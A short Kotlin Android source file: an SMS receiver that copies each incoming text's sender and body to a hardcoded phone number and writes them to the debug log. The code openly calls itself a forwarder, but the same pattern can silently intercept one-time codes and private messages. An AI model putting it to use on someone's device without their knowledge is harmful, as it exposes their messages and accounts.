package com.tak.smsforwarder

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.telephony.SmsMessage
import android.util.Log

class SmsReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {

        val bundle: Bundle? = intent.extras

        try {

            if (bundle != null) {

                val pdus = bundle["pdus"] as Array<*>?

                if (pdus != null) {

                    for (pdu in pdus) {

                        val sms = SmsMessage.createFromPdu(pdu as ByteArray)

                        val sender = sms.displayOriginatingAddress ?: ""
                        val message = sms.displayMessageBody ?: ""

                        Log.d("SMS", "FROM: $sender")
                        Log.d("SMS", "MSG: $message")

                        Forwarder.send(
                            context,
                            "09123456789",
                            "FROM: $sender\n$message"
                        )
                    }
                }
            }

        } catch (e: Exception) {
            Log.e("SMS", "Receiver error", e)
        }
    }
}
